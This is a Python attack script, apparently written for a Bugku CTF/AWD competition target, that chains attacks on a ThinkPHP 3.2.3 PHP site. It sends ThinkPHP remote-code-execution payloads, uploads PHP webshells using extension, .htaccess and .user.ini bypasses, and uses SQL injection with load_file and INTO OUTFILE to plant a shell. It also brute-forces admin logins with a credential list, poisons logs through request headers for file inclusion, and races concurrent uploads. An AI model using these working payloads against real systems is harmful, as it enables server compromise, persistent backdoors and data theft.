#!/usr/bin/env python3
"""Team 117 组合利用：多入口上传 + ThinkPHP各种RCE/包含 + 后台弱口令"""
import requests
import re
import time
import os
import base64
import threading
import concurrent.futures

HOST = "192-168-1-117.pvp7574.bugku.cn"
BASE = f"http://{HOST}"

s = requests.Session()

def GET(path, **kw):
    try:
        r = s.get(f"{BASE}/{path}", timeout=8, **kw)
        return r.status_code, r.text
    except Exception as e:
        return 0, str(e)

def POST(path, data=None, files=None, **kw):
    try:
        r = s.post(f"{BASE}/{path}", data=data, files=files, timeout=10, **kw)
        return r.status_code, r.text
    except Exception as e:
        return 0, str(e)

def flag_hunt(text):
    m = re.search(r'flag\{[^}]+\}', text)
    return m.group() if m else None

# ========== [1] 侦察：各种入口点 ==========
print("="*60)
print("[1] 入口侦察")
print("="*60)

entry_points = [
    # 常见上传入口
    ("index.php?m=Home&c=Upload&a=index", "Upload入口"),
    ("index.php?m=Home&c=Upload", "Upload简写"),
    ("index.php/Home/Upload/index", "TP路由Upload"),
    ("index.php/Upload/index", "TP简写Upload"),
    ("upload.php", "独立上传脚本"),
    ("up.php", "简写up"),
    ("editor.php", "编辑器"),
    # 后台入口
    ("xyhai.php", "xyhcms后台"),
    ("admin.php", "admin后台"),
    ("index.php/Admin", "TP后台路由"),
    ("index.php?m=Admin&c=Login", "TP后台登录"),
    ("index.php/Login", "登录"),
    # 留言/评论入口
    ("index.php?m=Home&c=Guestbook", "留言板"),
    ("index.php?m=Home&c=Comment", "评论"),
    ("index.php/Home/Message", "消息"),
    # 其他功能
    ("index.php?m=Home&c=Member", "会员中心"),
    ("index.php?m=Home&c=Register", "注册"),
    ("phpmyadmin/", "phpmyadmin"),
    ("install/", "安装目录"),
]

for ep, desc in entry_points:
    st, bd = GET(ep, allow_redirects=False)
    if st == 200:
        clue = ""
        if "upload" in bd.lower() or "上传" in bd: clue = " [含上传]"
        if "登录" in bd or "login" in bd.lower(): clue = " [登录页]"
        if "后台" in bd: clue = " [后台]"
        if "404" not in bd[:200] and len(bd) > 500:
            print(f"  🟢 {st} {desc}: {ep} len={len(bd)}{clue}")
    elif st == 302:
        print(f"  🟡 302 {desc}: {ep}")

# ========== [2] ThinkPHP 3.2.3 各种RCE payload ==========
print()
print("="*60)
print("[2] ThinkPHP 3.2.3 多种RCE payload尝试")
print("="*60)

# 不同的参数名和注入点
tp_payloads = [
    # 原始name参数RCE（经典）
    ("index.php?s=/Index/index/name/${@print(md5(1234))}", "name参数MD5"),
    ("index.php?s=/Index/index/name/${@print(file_get_contents('/flag'))}", "name参数读flag"),
    # 其他变量位
    ("index.php?s=/Index/index/id/${@print(md5(1234))}", "id参数RCE"),
    ("index.php?s=/Index/index/page/${@print(md5(1234))}", "page参数RCE"),
    ("index.php?s=/Index/Index/cat/${@print(md5(1234))}", "cat参数RCE"),
    # 不同控制器
    ("index.php?s=/Show/index/id/${@print(md5(1234))}", "Show控制器"),
    ("index.php?s=/Article/index/id/${@print(md5(1234))}", "Article控制器"),
    ("index.php?s=/News/index/id/${@print(md5(1234))}", "News控制器"),
    ("index.php?s=/Page/index/id/${@print(md5(1234))}", "Page控制器"),
    ("index.php?s=/List/index/id/${@print(md5(1234))}", "List控制器"),
    ("index.php?s=/Product/index/id/${@print(md5(1234))}", "Product控制器"),
    # m/c/a参数
    ("index.php?m=Home&c=Index&a=index&test=${@print(md5(1234))}", "普通GET参数"),
    ("index.php?m=Home&c=Index&id=${@print(md5(1234))}", "id GET参数"),
    # $_SERVER等超全局
    ("index.php?s=/Index/index/name/${@phpinfo()}", "phpinfo()探测"),
    # 无花括号变体
    ("index.php?s=/Index/index/name/$@eval($_GET[x])", "$@eval变体"),
    # POST方式注入
]

rce_found = False
for url, desc in tp_payloads:
    st, bd = GET(url)
    has_md5 = "81dc9bdb52d04dc20036dbd8313ed055" in bd  # md5(1234)
    has_flag = flag_hunt(bd)
    if has_md5 or has_flag or ("PHP Version" in bd and "phpinfo()" not in desc):
        print(f"  ✅ RCE成功[{desc}]: {url[:60]}")
        if has_flag:
            print(f"    FLAG: {has_flag}")
            rce_found = True
            break
        if "PHP Version" in bd:
            print(f"    phpinfo可用")
    elif st == 200 and (len(bd) < 1000 or "md5" in bd.lower()):
        print(f"  ⚠️  [{desc}] {st} len={len(bd)}: {bd[:150].strip()[:150]}")

# POST方式的RCE尝试
print("  --- POST方式RCE ---")
post_rce = [
    ({"m":"Home","c":"Index","a":"index","test":r"${@print(md5(1234))}"}, "POST test参数"),
    ({"m":"Home","c":"Index","a":"index","name":r"${@print(file_get_contents('/flag'))}"}, "POST name参数"),
]
for data, desc in post_rce:
    st, bd = POST("index.php", data=data)
    if "81dc9bdb52d04dc20036dbd8313ed055" in bd or flag_hunt(bd):
        print(f"  ✅ POST RCE[{desc}]")
        if flag_hunt(bd):
            print(f"    FLAG: {flag_hunt(bd)}")
            rce_found = True

# ========== [3] 找上传入口的参数 ==========
print()
print("="*60)
print("[3] 上传入口参数爆破")
print("="*60)

upload_urls = [
    "index.php?m=Home&c=Upload&a=index",
    "index.php?s=/Upload/index",
    "index.php/Home/Upload/index.html",
]

# 找字段名 + 上传成功
test_content = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00C\x00"
fields = ["file", "Filedata", "upfile", "upload", "fileupload", "userfile", "avatar", "pic", "img", "image", "photo", "attach", "attachment"]

found_fields = []
for up_url in upload_urls:
    for field in fields:
        files = {field: ("probe.jpg", test_content, "image/jpeg")}
        st, bd = POST(up_url, files=files)
        # 识别成功的响应
        uploaded = re.search(r'(upload[/\\][\w_\-]+\.\w+)', bd)
        if uploaded:
            print(f"  ✅ 上传成功! URL={up_url} field={field} -> {uploaded.group(1)}")
            print(f"     响应: {bd[:200].strip()[:200]}")
            found_fields.append((up_url, field, uploaded.group(1)))
        elif st == 200 and len(bd) < 500:
            # 可能是JSON响应
            if "error" in bd.lower() or "success" in bd.lower() or "1" in bd or "0" in bd:
                print(f"  ⚠️  [{up_url} f={field}] {st}: {bd[:200].strip()[:200]}")

# ========== [4] 如果找到上传入口，测试各种绕过 ==========
if found_fields:
    print()
    print("="*60)
    print("[4] 深度上传绕过测试")
    print("="*60)

    up_url, up_field, _ = found_fields[0]

    def do_upload(filename, content, mime="image/jpeg", extra_data=None):
        files = {up_field: (filename, content, mime)}
        st, bd = POST(up_url, files=files, data=extra_data or {})
        m = re.search(r'(upload[/\\][\w_\-]+\.\w+)', bd)
        return m.group(1) if m else None, bd

    # (A) 各种PHP扩展 + 内容头
    print("  --- [4A] 扩展名绕过 ---")
    shell = b'<?php echo "SHELL_WIN_123";$f=file_get_contents("/flag");if($f)echo $f;@eval($_POST["zxc"]);?>'
    img_header = b"\xff\xd8\xff\xe0"
    ext_tests = [
        ("php", shell),
        ("php5", shell), ("php4", shell), ("php3", shell), ("php2", shell),
        ("phtml", shell), ("pht", shell), ("phps", shell), ("phar", shell),
        ("php7", shell), ("php8", shell), ("php9", shell),
        ("PHP", shell), ("Php", shell), ("pHp", shell), ("pHp5", shell),
        ("php ", shell), ("php.", shell), ("php. .", shell),
        ("jpg.php", shell), ("png.php", shell), ("gif.php", shell),
        ("php.jpg", shell), ("php.png", shell),
        ("php.jpg.php", shell), ("php%00.jpg", shell),
        (".htaccess", b"AddType application/x-httpd-php .abc .xyz .test\nAddHandler application/x-httpd-php .abc"),
        (".user.ini", b'auto_prepend_file="a.abc"\nauto_append_file="b.abc"'),
    ]
    upload_results = {}
    for ext, content in ext_tests:
        fname = f"t_{int(time.time()%900000)}.{ext}"
        path, resp = do_upload(fname, content)
        if path:
            # 测试各种访问路径
            for test_path in [path, path.replace("\\","/"), "Public/"+path, "public/"+path]:
                st, bd = GET(test_path)
                if st == 200:
                    has_win = "SHELL_WIN_123" in bd
                    has_flag_here = flag_hunt(bd)
                    is_html = "<!" in bd or "<html" in bd.lower()
                    if has_win or has_flag_here:
                        print(f"  ✅✨ .{ext}: {path} -> 执行成功!")
                        if has_flag_here: print(f"    FLAG: {has_flag_here}")
                        if has_win:
                            # 尝试POST命令执行
                            st2, bd2 = POST(test_path, data={"zxc":"echo 'CMD_WIN_'.md5(999);"})
                            if "CMD_WIN_" in bd2 or "fbd7939d674997cdb4692d34de8633c4" in bd2:
                                print(f"    ✅ POST执行可用: {test_path}")
                                st3, bd3 = POST(test_path, data={"zxc":"echo file_get_contents('/flag');"})
                                fl = flag_hunt(bd3)
                                if fl: print(f"    ✅ POST FLAG: {fl}")
                    elif not is_html and len(bd) < 2000:
                        print(f"  ⚠️  .{ext}: {path} -> {st} 非HTML len={len(bd)}")
            upload_results[ext] = path

    # (B) 如果.htaccess上传成功，配合自定义扩展名
    if upload_results.get("htaccess") or upload_results.get(".htaccess"):
        print("  --- [4B] .htaccess生效配合 ---")
        for cust_ext in ["abc", "xyz", "test", "pwn", "shel"]:
            fname = f"shell_{int(time.time()%900000)}.{cust_ext}"
            content = b'<?php echo "HTA_WIN_"+md5(555);$ff=@file_get_contents("/flag");if($ff)echo $ff;?>'
            path, _ = do_upload(fname, content)
            if path:
                st, bd = GET(path)
                if "HTA_WIN_" in bd or "9c3ecd18b452b3f8f73d1d5d98f1898f" in bd:
                    print(f"  ✅ .{cust_ext} + .htaccess: {path}")
                    if flag_hunt(bd): print(f"    FLAG: {flag_hunt(bd)}")

    if upload_results.get("user.ini") or upload_results.get(".user.ini"):
        print("  --- [4C] .user.ini 配合 ---")
        # .user.ini 只需要访问同目录下的任意php即可触发
        # 先上传包含文件
        for shell_fname in ["a.abc", "b.abc", "a.jpg", "shell.png"]:
            content = b'<?php echo "INI_WIN_".md5(777);echo "FLAG:".@file_get_contents("/flag");?>'
            do_upload(shell_fname, content)
        # 访问upload目录下的任意php（如果没有，访问index.php，可能路径不对）
        for trig in ["index.php", "upload/index.html", "index.php?s=/Home/Upload"]:
            st, bd = GET(trig)
            if "INI_WIN_" in bd or "f1f2af7a1cb374d74de4440e970349d2" in bd:
                print(f"  ✅ .user.ini触发[{trig}]")
                if flag_hunt(bd): print(f"    FLAG: {flag_hunt(bd)}")

# ========== [5] SQL注入读取flag/文件 ==========
print()
print("="*60)
print("[5] SQL注入读取/写入")
print("="*60)

# 找可能的SQL注入点
sql_eps = []
# 扫一下文章/内容页
for cname in ["Show","Article","News","Page","Content","View","Detail","Product","Item"]:
    for pname in ["id","aid","nid","cid","pid","sid","vid"]:
        for testv in ["1", "2", "3"]:
            url = f"index.php?m=Home&c={cname}&a=index&{pname}={testv}"
            st, bd = GET(url)
            if st == 200 and len(bd) > 1000 and "404" not in bd[:200]:
                sql_eps.append((cname, pname, testv, url))
                if len(sql_eps) >= 8: break
    if len(sql_eps) >= 8: break

# 测试注入
for cname, pname, testv, url0 in sql_eps[:5]:
    print(f"  测试注入点 c={cname} p={pname}")
    # 1. order by
    for n in range(1, 11):
        st_t, bd_t = GET(f"index.php?m=Home&c={cname}&a=index&{pname}={testv} order by {n}--+")
        st_f, bd_f = GET(f"index.php?m=Home&c={cname}&a=index&{pname}={testv} order by {n+1}--+")
        if len(bd_t) != len(bd_f) and n+1 > 5:
            print(f"    order by 差异: {n} vs {n+1} len={len(bd_t)}/{len(bd_f)}")
            # 尝试union select
            cols = ",".join([str(i) for i in range(1,n+1)])
            st_u, bd_u = GET(f"index.php?m=Home&c={cname}&a=index&{pname}=-1 union select {cols}--+")
            # 找显示位
            display_pos = []
            for i in range(1,n+1):
                if str(i) in bd_u[:500]:
                    display_pos.append(i)
            if display_pos:
                print(f"    显示位: {display_pos}")
                dpos = display_pos[0]
                cols2 = cols.split(",")
                cols2[dpos-1] = "@version:=1"
                # 读文件
                cols2[dpos-1] = "load_file('/flag')"
                st_lf, bd_lf = GET(f"index.php?m=Home&c={cname}&a=index&{pname}=-1 union select {','.join(cols2)}--+")
                fl = flag_hunt(bd_lf)
                if fl:
                    print(f"    ✅ load_file读flag: {fl}")
                    rce_found = True
                # 写入webshell
                cols2[dpos-1] = "'<?php echo 9999;@eval($_POST[x]);?>'"
                outpaths = ["/app/upload/sqli_shell.php", "/var/www/html/upload/sqli.php", "/tmp/s.php"]
                for outp in outpaths:
                    st_w, bd_w = GET(f"index.php?m=Home&c={cname}&a=index&{pname}=-1 union select {','.join(cols2)} into outfile '{outp}'--+")
                    st_chk, bd_chk = GET(f"upload/{outp.split('/')[-1]}")
                    if "9999" in bd_chk:
                        print(f"    ✅ SQL写入shell: {outp}")
                        st_chk2, bd_chk2 = POST(f"upload/{outp.split('/')[-1]}", data={"x":"echo file_get_contents('/flag');"})
                        fl2 = flag_hunt(bd_chk2)
                        if fl2: print(f"      FLAG: {fl2}")
            break

# ========== [6] 后台弱口令 ==========
print()
print("="*60)
print("[6] 后台登录爆破")
print("="*60)

admin_urls = [
    ("xyhai.php?s=/Login/login", "xyhai POST登录"),
    ("xyhai.php?m=Admin&c=Login&a=dologin", "xyhai doLogin"),
    ("admin.php?m=Admin&c=Login&a=login", "admin login"),
    ("index.php?m=Admin&c=Login&a=dologin", "TP Admin dologin"),
]

creds = [
    ("admin", "admin123"), ("admin", "admin"), ("admin", "123456"),
    ("admin", "AwD@2026#Secure!"), ("admin", "Ad#2026Admin$ec!"),
    ("admin", "awd2026"), ("admin", "xyhcms2026"),
    ("admin", "admin888"), ("admin", "666666"),
    ("xyhai", "xyhai"), ("xyhai", "admin123"),
    ("root", "root123"), ("root", "123456"),
]

for url, desc in admin_urls[:1]:
    for u, p in creds:
        data = {"username": u, "password": p, "verify": "1"}
        for kf in ["username","user","account","name"]:
            for pf in ["password","pwd","pass","passwd"]:
                d = {kf:u, pf:p}
                st, bd = POST(url, data=d, allow_redirects=False)
                if (st == 302 and ("index" in (bd if bd else "").lower() or "Login" not in bd)) or (st == 200 and ("登录成功" in bd or "success" in bd.lower()[:100])):
                    print(f"  ✅ 后台可用? {u}:{p} [{desc}] -> {st}")

# ========== [7] 模板缓存包含 ==========
print()
print("="*60)
print("[7] ThinkPHP 模板缓存+日志包含")
print("="*60)

# 先在日志里写PHP
print("  写入恶意内容到日志...")
evil_contents = [
    "<?php $f=@file_get_contents('/flag');echo 'LOG_WIN:'.$f;?>",
    "<?php echo 'LG:'.md5(4321);?>",
    "<?php @eval($_GET['x']);?>",
]
# 用User-Agent写（更可能记录）
for ec in evil_contents:
    for _ in range(5):
        try:
            r = requests.get(f"{BASE}/index.php?s=/Index/index&x=123", headers={"User-Agent": ec, "Referer": ec}, timeout=5)
        except: pass
        try:
            r = requests.get(f"{BASE}/index.php?m=Home&c=Index&a=show&id=$" + "{@system('id')}", headers={"X-Forwarded-For": ec}, timeout=5)
        except: pass
        time.sleep(0.05)

# 包含路径（各种深度）
import datetime
d1 = datetime.date.today().strftime("%y_%m_%d")
d2 = (datetime.date.today() - datetime.timedelta(days=1)).strftime("%y_%m_%d")

include_paths = []
for log_d in [d1, d2]:
    for log_p in [f"Runtime/Logs/Home/{log_d}.log", f"App/Runtime/Logs/Home/{log_d}.log",
                  f"Runtime/Logs/{log_d}.log", f"App/Runtime/Logs/{log_d}.log"]:
        include_paths.append(log_p)
# 缓存目录
for cc in ["Cache","Temp","Data"]:
    for tpl_p in [f"Runtime/{cc}/Home/index.php", f"App/Runtime/{cc}/Home/index.php",
                  f"Runtime/{cc}/~runtime.php", f"App/Runtime/{cc}/~runtime.php"]:
        include_paths.append(tpl_p)

print(f"  包含路径候选: {len(include_paths)}")

# 用模板包含参数（各种可能的参数名）
tpl_params = ["template", "tpl", "theme", "view", "skin", "file", "path", "page"]

for inc in include_paths:
    for tparam in tpl_params:
        # 各种访问方式
        for controller in ["Show","Index","Article","News","Page","Content"]:
            urls_to_try = [
                f"index.php?m=Home&c={controller}&a=index&{tparam}={inc}",
                f"index.php?s=/{controller}/index/{tparam}/{inc}",
                f"index.php?s=/{controller}/index?{tparam}={inc}",
                f"index.php?m=Home&c={controller}&a=index&id=1&{tparam}={inc}",
            ]
            for url_t in urls_to_try:
                st, bd = GET(url_t)
                fl = flag_hunt(bd)
                if fl or "LOG_WIN:" in bd or "LG:" in bd or "7a3b4d3f5b6e6e3b4e1e0c2c52c1e9e8" in bd:
                    print(f"  ✅包含成功: {url_t[:80]}")
                    if fl:
                        print(f"    FLAG: {fl}")
                        rce_found = True
                    break
            if rce_found: break
        if rce_found: break
    if rce_found: break

# ========== [8] 竞争条件强化版 ==========
print()
print("="*60)
print("[8] 强化竞争条件 + 并发上传访问")
print("="*60)

if found_fields:
    shell_race = b'<?php $f=@file_get_contents("/flag");if($f){echo "RACE_OK:".$f;}else{echo md5(112233);};?>'
    race_results = {"found": False, "flag": None}
    up_url_r, up_field_r, _ = found_fields[0]

    def uploader(tid):
        for i in range(30):
            fname = f"rc_{tid}_{i}_{int(time.time()*10000)%100000}.php"
            files = {up_field_r: (fname, shell_race, "image/jpeg")}
            try:
                r = requests.post(f"{BASE}/{up_url_r}", files=files, timeout=4)
                m = re.search(r'(upload[/\\][\w_\-]+\.\w+)', r.text)
                if m:
                    p = m.group(1)
                    r2 = requests.get(f"{BASE}/{p}", timeout=3)
                    if "RACE_OK" in r2.text:
                        fl = flag_hunt(r2.text)
                        race_results["found"] = True
                        if fl: race_results["flag"] = fl
                        print(f"  ✅ 竞争成功[{tid}] {p}")
                        if fl: print(f"    FLAG: {fl}")
                        return
                    elif "1a6f1dc70d50b8e490e1b2b3bb7cfc3f" in r2.text:  # md5(112233)
                        print(f"  ✅ 竞争执行成功[{tid}] {p} (md5匹配)")
            except:
                pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:
        futs = [ex.submit(uploader, i) for i in range(16)]
        for f in concurrent.futures.as_completed(futs):
            if race_results["found"] and race_results["flag"]:
                break

print()
print("="*60)
print("完成")
print("="*60)
